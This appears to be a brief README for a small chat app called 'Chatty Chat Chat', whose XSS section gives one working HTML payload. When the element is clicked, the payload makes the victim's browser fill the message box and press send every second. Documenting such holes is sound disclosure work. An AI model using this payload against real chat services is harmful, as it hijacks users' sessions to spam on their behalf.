# Chatty Chat Chat

Except for initial boilerplate and some cleanup written in an hour.

## XSS

```html
<b onclick="function t() {document.getElementById('new-message-input').value = '❤️'; document.getElementById('send').click(); setTimeout(t, 1000);} t();">❤️</b>
```
